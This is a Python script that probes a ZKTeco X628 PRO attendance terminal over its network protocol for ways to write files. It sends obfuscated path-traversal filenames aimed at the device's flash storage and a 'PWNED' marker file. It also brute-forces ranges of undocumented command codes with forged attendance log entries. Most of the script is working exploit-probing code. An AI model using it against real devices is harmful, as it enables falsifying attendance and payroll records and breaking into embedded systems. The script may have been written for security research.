#!/usr/bin/env python3
"""Test file write vectors on X628 PRO with proper PREPARE_DATA + DATA flow."""
import sys
sys.path.insert(0, 'D:\\chamcong\\AttendanceSuite_Portable\\python\\Lib\\site-packages')
sys.stdout.reconfigure(encoding='utf-8')

import socket, struct, time
from zk import ZK, const
from struct import pack, unpack

def send_cmd(conn, command, data=b''):
    try:
        return conn._ZK__send_command(command, data, response_size=1024)
    except Exception as e:
        return {'status': False, 'error': str(e)}

def cmd_str(c):
    return '0x%04X' % (c or 0)

zk = ZK('172.16.0.214', port=4370, timeout=10, password=0)
conn = zk.connect()
print('[+] Connected:', conn.get_firmware_version(), conn.get_platform())

try:
    conn.disable_device()
except: pass

sock = conn._ZK__sock
session_id = conn._ZK__session_id

# === TEST: send_file with PREPARE_DATA + DATA chunks ===
# First, try setting up upload with PREPARE_DATA size
print('\n=== TEST: send_file via PREPARE_DATA (size only) ===')
test_content = b'TEST_MAVIS_PWNED_2026'
r = send_cmd(conn, const.CMD_PREPARE_DATA, pack('I', len(test_content)))
print('  PREPARE_DATA size={}:'.format(len(test_content)), r)

# Send a data chunk
print('\n=== TEST: send CMD_DATA chunk ===')
r = send_cmd(conn, const.CMD_DATA, test_content)
print('  CMD_DATA:', r)

# Try CMD_UPDATEFILE with proper structure (filename \x00 size \x00 data)
print('\n=== TEST: UPDATEFILE with various filename variants ===')
TRAV_BIN = (".." + chr(47) + ".." + chr(47) + ".." + chr(47) + ".." + chr(47) + ".." + chr(47) + ".." + chr(47) + ".." + chr(47) + "mnt" + chr(47) + "mtdblock" + chr(47) + "data" + chr(47) + "mavis_test.txt").encode()
payload_variants = [
    TRAV_BIN + b'\x00' + b'CONTENT',
    b'mavis_test.txt\x00' + b'CONTENT',
    b'/mnt/mtdblock/data/mavis_test.txt\x00' + b'CONTENT',
    TRAV_BIN + b'\x00' + pack('I', 7) + b'CONTENT',
]
for i, p in enumerate(payload_variants, 1):
    r = send_cmd(conn, 0x6A4, p)
    print('  Variant', i, ':', r)

# Try SSR_SetDeviceData equivalent (unknown code)
print('\n=== TEST: SSR-style write commands ===')
for cmd in [0x06A7, 0x06A8, 0x06A9, 0x06AA, 0x06AB, 0x06AC, 0x06AD, 0x06AE, 0x06AF,
            0x06B0, 0x06B1, 0x06B2, 0x06B3, 0x06B4, 0x06B5, 0x06B6, 0x06B7, 0x06B8]:
    try:
        r = send_cmd(conn, cmd, b'test\x00')
        code = r.get('code', 0)
        # Filter interesting responses
        if code not in [65535, 2001, 0]:
            print('  0x{:04X}: status={} code={}'.format(cmd, r.get('status', False), cmd_str(code)))
    except: pass

# Try DATA UPDATE via push-style commands
print('\n=== TEST: DATA UPDATE push-style (if cloud mode somehow active) ===')
for cmd in [0x0127, 0x0128, 0x0129, 0x012B, 0x012C]:
    try:
        r = send_cmd(conn, cmd, b'C:1:DATA UPDATE ATTLOG PIN=1\tTime=2026-09-16 08:00:00\x00')
        code = r.get('code', 0)
        if code not in [65535, 2001, 0]:
            print('  0x{:04X}: status={} code={}'.format(cmd, r.get('status', False), cmd_str(code)))
    except: pass

# Try the actual write commands from SDK (SendFile, WriteFile, etc.)
print('\n=== TEST: SendFile-style writes (cmd codes from official SDK) ===')
# From zkemkeeper SDK: SendFile uses internal protocol, exact cmd not in public docs
# Try SSR_SetDeviceData equivalent
for cmd in range(0x06A0, 0x06F0):
    try:
        r = send_cmd(conn, cmd, b'attlog_test\x00' + b'PIN=1\tTime=2026-09-16 08:00:00')
        code = r.get('code', 0)
        if code not in [65535, 2001, 0] and r.get('status', False):
            print('  0x{:04X}: OK code={}'.format(cmd, cmd_str(code)))
    except: pass

# Try ATTLOG_DATA_WRITE specific commands
print('\n=== TEST: ATTLOG_DATA_WRITE commands ===')
for cmd in [0x2748, 0x2749, 0x274A, 0x274B, 0x274C, 0x274D, 0x274E, 0x274F,
            0x2750, 0x2751, 0x2752, 0x2753, 0x2754, 0x2755, 0x2756, 0x2757,
            0x2758, 0x2759, 0x275A, 0x275B, 0x275C, 0x275D, 0x275E, 0x275F]:
    try:
        r = send_cmd(conn, cmd, b'PIN=1\t2026-09-16 08:00:00\t0\t1\x00')
        code = r.get('code', 0)
        if code not in [65535, 2001, 0]:
            print('  0x{:04X}: status={} code={}'.format(cmd, r.get('status', False), cmd_str(code)))
    except: pass

# Check if ADMS-related commands respond
print('\n=== TEST: ADMS handshake attempt ===')
for cmd in [0x2711, 0x2712, 0x2710, 0x270F, 0x270E]:
    try:
        r = send_cmd(conn, cmd, b'SN=test\x00')
        code = r.get('code', 0)
        if code not in [65535, 2001, 0]:
            print('  0x{:04X}: status={} code={}'.format(cmd, r.get('status', False), cmd_str(code)))
    except: pass

try:
    conn.enable_device()
except: pass
try:
    conn.disconnect()
except: pass
print('\n[+] Done')
